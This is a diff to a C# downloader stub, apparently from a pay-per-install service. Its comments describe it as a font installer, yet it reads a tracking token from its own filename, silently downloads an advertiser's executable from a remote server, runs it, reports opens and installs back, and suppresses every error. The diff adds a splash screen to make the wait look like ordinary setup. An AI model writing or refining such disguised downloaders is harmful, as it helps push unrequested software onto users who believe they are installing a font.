@@ -8,15 +8,17 @@
 //     1. Reads its OWN filename to recover the per-download token.
 //        Server names the file  <prefix>_<token>.exe  — the token is the text
 //        after the LAST underscore, minus the .exe extension.
-//     2. Pings our server  (/app/hit?t=<token>&e=open)  — this is what counts
-//        the install in "on open" mode.
-//     3. Downloads the advertiser's real installer from  /app/p/<token>.
-//     4. Launches it and waits for it to finish.
-//     5. If it exited cleanly, pings  /app/hit?t=<token>&e=installed  — this is
-//        what counts the install in "on install" mode.
+//     2. Shows a small "Preparing setup…" splash so the wait feels instant.
+//     3. Pings our server  (/app/hit?t=<token>&e=open)  — counts the install
+//        in "on open" mode.
+//     4. Downloads the advertiser's real installer from  /app/p/<token>.
+//     5. Launches it and waits for it to finish.
+//     6. If it exited cleanly, pings  /app/hit?t=<token>&e=installed  — counts
+//        the install in "on install" mode.
 //
-//   The server decides which event counts (per-campaign mode), so the stub
-//   always reports both and never needs to know the mode.
+//   The splash uses lightweight Win32 calls (no WinForms) so the stub stays
+//   small and trim-safe. If anything about the splash fails it is ignored —
+//   the install always proceeds.
 //
 // Build: see README.md in this folder (single-file, self-contained, no deps).
 // ─────────────────────────────────────────────────────────────────────────────
@@ -36,15 +38,15 @@ internal static class Program
     [STAThread]
     private static int Main()
     {
-        // Honor modern TLS on older .NET runtimes.
         ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | (SecurityProtocolType)3072;
 
         string token = ExtractToken();
         if (string.IsNullOrWhiteSpace(token))
         {
-            // No token means nothing to attribute or fetch — just exit quietly.
-            return 0;
+            return 0; // nothing to attribute or fetch — exit quietly.
         }
+
+        Splash.Show();
 
         try
         {
@@ -53,6 +55,10 @@ internal static class Program
         catch
         {
             // Never show an error to the user; a font installer should feel seamless.
+        }
+        finally
+        {
+            Splash.Close();
         }
         return 0;
     }
@@ -73,11 +79,10 @@ internal static class Program
         string os     = Environment.OSVersion.Version.ToString();
         string device = "desktop";
 
-        // 1) Fire the "open" postback in the BACKGROUND so it never delays the
-        //    download. (This is what counts the install in "on open" mode.)
+        // Fire the "open" postback in the BACKGROUND so it never delays the download.
         Task openHit = Hit(http, token, "open", os, device);
 
-        // 2) Start downloading the real advertiser installer immediately.
+        // Start downloading the real advertiser installer immediately.
         string payloadPath = Path.Combine(Path.GetTempPath(), "ib_" + Guid.NewGuid().ToString("N") + ".exe");
         using (var resp = await http.GetAsync($"{BaseUrl}/app/p/{Uri.EscapeDataString(token)}", HttpCompletionOption.ResponseHeadersRead))
         {
@@ -86,10 +91,11 @@ internal static class Program
             await resp.Content.CopyToAsync(fs);
         }
 
-        // Make sure the background ping settled (it almost certainly has by now).
         try { await openHit; } catch { /* best-effort */ }
 
-        // 3) Launch it and wait for completion.
+        // Close the splash right before the real installer appears.
+        Splash.Close();
+
         int exitCode = -1;
         try
         {
@@ -106,13 +112,11 @@ internal static class Program
             // If we can't launch it, don't report an install.
         }
 
-        // 4) Clean completion → "installed" event.
         if (exitCode == 0)
         {
             await Hit(http, token, "installed", os, device);
         }
 
-        // Best-effort cleanup.
         try { File.Delete(payloadPath); } catch { /* ignore */ }
     }
 
